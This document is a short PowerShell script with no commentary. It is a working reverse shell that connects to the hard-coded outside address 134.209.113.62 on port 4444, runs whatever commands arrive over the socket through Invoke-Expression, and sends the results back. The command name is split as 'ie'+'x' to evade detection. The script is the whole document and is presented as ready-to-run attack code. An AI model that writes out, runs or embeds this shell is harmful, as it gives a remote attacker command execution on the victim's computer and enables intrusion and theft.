$h='System.Net.Sockets.TcpClient'
$i='134.209.113.62'
$p=4444
$a='System.Text.ASCIIEncoding'
$c=New-Object ($h) ($i,$p)
$s=$c.GetStream()
$b=New-Object Byte[] 65536
$e=New-Object ($a)

while(($r=$s.Read($b,0,$b.Length)) -ne 0){
    $d=$e.GetString($b,0,$r)
    $t=&('ie'+'x') $d 2>&1 | Out-String
    $t2=$t+('PS '+(gp 'HKCU:\Console').WindowTitle+'> ')
    $m=$e.GetBytes($t2)
    $s.Write($m,0,$m.Length)
    $s.Flush()
}
$c.Close()
